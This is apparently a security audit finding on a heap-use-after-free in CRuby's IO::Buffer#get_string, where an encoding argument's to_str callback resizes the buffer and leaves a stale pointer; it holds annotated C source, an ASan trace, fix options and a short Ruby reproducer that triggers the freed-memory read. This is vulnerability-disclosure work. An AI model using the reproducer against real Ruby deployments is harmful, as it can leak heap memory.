# FINDING-007 — `IO::Buffer#get_string` heap-use-after-free via reentrant encoding `to_str`

- **Status:** CONFIRMED (ASan), APPARENTLY NOVEL
- **Class:** heap-use-after-free (READ)
- **Macro-taxo:** workflow-0137 / workflow-0014 (borrowed native pointer used after reentrant
  user code invalidates the backing storage)
- **Target:** CRuby master `c4e06b4e30` (ruby 4.1.0dev), aarch64, clang ASan/UBSan build
  (`taxoshop/cruby-asan-ubsan:current`)
- **Component:** `io_buffer.c` — first IO::Buffer site in this audit (prior findings were
  array.c / pack.c / transcode.c)
- **Repro:** `repro/h_iobuf_getstring_uaf.rb`  · **Log:** `logs/h_iobuf_getstring.asan.txt`

## Summary

`IO::Buffer#get_string([offset, [length, [encoding]]])` captures the buffer's raw backing
pointer (`base`) into a local, then converts the **encoding** argument with `rb_find_encoding`,
which runs `StringValue` → the argument's `to_str`. That user callback can `resize` the buffer,
whose INTERNAL storage is `realloc`'d (old block freed, pointer moved). `get_string` then reads
`length` bytes through the stale local `base`, producing a clean heap-UAF read. The post-callback
`io_buffer_validate_range` does **not** catch it: for a non-slice buffer `io_buffer_validate()`
returns 1 unconditionally and only the (now-updated, larger) `buffer->size` is range-checked.

## Root cause

`io_buffer_get_string` (io_buffer.c:3253):

```c
size_t offset, length;
struct rb_io_buffer *buffer = io_buffer_extract_offset_length(self, argc, argv, &offset, &length);

const void *base;
size_t size;
io_buffer_get_bytes_for_reading(buffer, &base, &size);   // 3262: base = buffer->base (LIVE)

rb_encoding *encoding;
if (argc >= 3) {
    encoding = rb_find_encoding(argv[2]);                // 3266: StringValue -> user to_str RUNS
}
...
io_buffer_validate_range(buffer, offset, length);        // 3272: only checks buffer->size
const char *data = base ? (const char*)base + offset : NULL;   // 3274: STALE base
return rb_enc_str_new(data, length, encoding);           // 3276: memcpy(length) from freed block
```

`rb_find_encoding(argv[2])` → `str_find_encindex` → `name_for_encoding` (encoding.c:296)
→ `StringValue` → `rb_str_to_str` → `to_str`. A `to_str` that calls `buffer.resize(BIG)` hits
`rb_io_buffer_resize` (io_buffer.c:2202-2214) which for an INTERNAL buffer does
`realloc(buffer->base, size)` — growing from 64 B to 64 MiB forces realloc to move, freeing the
old 64 B block. `buffer->base`/`buffer->size` are updated, but the local `base` in `get_string`
still points at the freed allocation.

`io_buffer_validate_range` → `io_buffer_validate_for_reading` → `io_buffer_validate`: for a
non-slice buffer (`source == Qnil`) this returns 1 without inspecting `base`; the only numeric
check is `offset+length <= buffer->size`, which passes because `buffer->size` is now 64 MiB.
So the guard is bypassed and line 3276 reads 32 bytes from the freed 64 B region.

## ASan evidence (logs/h_iobuf_getstring.asan.txt)

```
==7==ERROR: AddressSanitizer: heap-use-after-free ... READ of size 32
    #3 str_enc_new string.c:1109
    #4 io_buffer_get_string io_buffer.c:3276           <- USE (read from stale base)
freed by thread T0 here:
    #0 realloc
    #1 rb_io_buffer_resize io_buffer.c:2203            <- FREE (realloc move)
    #2 io_buffer_resize io_buffer.c:2249
    ...
    #16 rb_str_to_str string.c:1818
    #18 name_for_encoding encoding.c:296
    #20 rb_find_encoding encoding.c:345
    #21 io_buffer_get_string io_buffer.c:3266          <- reentrancy boundary (encoding to_str)
previously allocated by thread T0 here:
    #0 calloc
    #1 io_buffer_initialize io_buffer.c:216            <- original 64-byte INTERNAL buffer
```

READ size 32 == the requested `length`; freed region == original 64-byte INTERNAL allocation.

## Reproducer (`repro/h_iobuf_getstring_uaf.rb`)

```ruby
$buf = IO::Buffer.new(64)   # INTERNAL, non-slice, not locked
evil = Object.new
def evil.to_str
  $buf.resize(64 * 1024 * 1024)  # realloc moves -> old 64B block freed
  "UTF-8"
end
$buf.get_string(0, 32, evil)     # reads 32 bytes from the freed block -> UAF
```

Run: `./run.sh repro/h_iobuf_getstring_uaf.rb` (base image loads IO::Buffer without extra
load-path flags; the transcoder `-I` flags of run2.sh are not needed here).

## Why the guards miss it

- `get_value`/`set_value`/`get_values`/`size_of` were verified HARDENED earlier in this audit
  because they fetch `base` **after** every user-code conversion. `get_string` is the outlier:
  its only user-code-convertible argument (the **encoding**) is converted *after* `base` is
  captured, and `rb_find_encoding` is the sole such site in io_buffer.c (grep: line 3266 only).
- `io_buffer_validate_range` re-validates the *buffer object* but not the *local pointer*, and
  for non-slice buffers `io_buffer_validate` is a no-op — so a grow-realloc slips through.
- `get_string` does not lock the buffer (no `locked_for_reading` wrapper), so `resize` from the
  callback is permitted; the lock guard that protects `each`/`copy` does not apply here.

## Fix options

1. Re-fetch `base`/`size` from the buffer **after** `rb_find_encoding` (right before use),
   mirroring the `get_value`/`set_value` ordering; or
2. Convert the encoding argument **before** `io_buffer_get_bytes_for_reading`; or
3. Lock the buffer for the duration (as `each`/`copy` do), turning a mid-op `resize` into a
   defined `IOBufferLockedError`.

## Dup-check

No matching upstream report found for `IO::Buffer#get_string` + encoding-argument reentrancy.
Same macro-taxo family as F001/F006 (borrowed source pointer dangled across a documented
callback) and the array reentrancy findings F002–F005, but a **new component (io_buffer.c)** and
a **new reentrancy vector (the encoding argument, not an index/length `to_int` or a block)**.
IO::Buffer accessors (`get_value`/`set_value`, `each`/`copy`) were previously found hardened; this
is the one accessor whose user-code conversion happens after the pointer capture.
